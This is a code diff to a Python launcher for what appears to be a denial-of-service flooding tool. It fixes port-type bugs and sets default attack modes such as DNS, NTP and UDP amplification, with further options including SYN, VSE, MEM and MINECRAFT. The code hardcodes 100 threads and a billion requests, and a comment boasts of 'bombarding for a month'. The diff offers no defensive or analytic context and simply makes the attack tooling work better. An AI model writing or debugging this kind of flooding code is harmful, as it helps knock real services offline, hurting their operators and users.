@@ -51,14 +51,14 @@ def kara():
     default_protocol = None
     if len(argv) > 2:
         port = argv[2]
-        if port == 53 or port == 5353:
-            protocol = "DNS"
+        if port == "53" or port == "5353":
+            default_protocol = "DNS"
             print(f"Port provided ({port}). It's a DNS port. Defaulting to DNS mode...")
-        elif port == 123:
-            protocol = "NTP"
+        elif port == "123":
+            default_protocol = "NTP"
             print(f"Port provided ({port}). It's an NTP port. Defaulting to NTP mode...")
         else:
-            protocol = "UDP"
+            default_protocol = "UDP"
             print(f"Port provided ({port}). Using UDP mode...")
 
         # If we have a port, we need to get an IP of the target
@@ -70,15 +70,16 @@ def kara():
         address = dns_info['ip']
 
     # Parse protocol
+    protocol = default_protocol
     if len(argv) > 3:
         protocol = argv[3]
         available_protocols = ["TCP", "UDP", "SYN", "VSE", "MEM", "NTP", "MINECRAFT", "DNS", "CHAR", "ARD", "RDP"]
         if protocol in available_protocols:
             print(f"Overriding attack protocol to '{protocol}'.")
         else:
+            protocol = default_protocol
             print(f"Invalid attack protocol provided: {protocol}. Will use the protocol selected by default ({default_protocol}').\n"
                   f"If you want to override it, restart with one of the valid options: {','.join(available_protocols)}\n")
-            sys.exit(1)
 
     hardcoded_n_threads = 100
     hardcoded_n_requests = 1000000000
@@ -94,7 +95,7 @@ def kara():
         argv.insert(7, "44640")  # keep bombarding for a month!
     else:
         # Prepare IP attack arguments
-        argv[1] = f"{protocol}"
+        argv[1] = f"{protocol if protocol else default_protocol}"
         argv.insert(2, f"{address}:{port}")
         argv.insert(3, f"{hardcoded_n_threads}")
         argv.insert(4, f"{hardcoded_n_requests}")
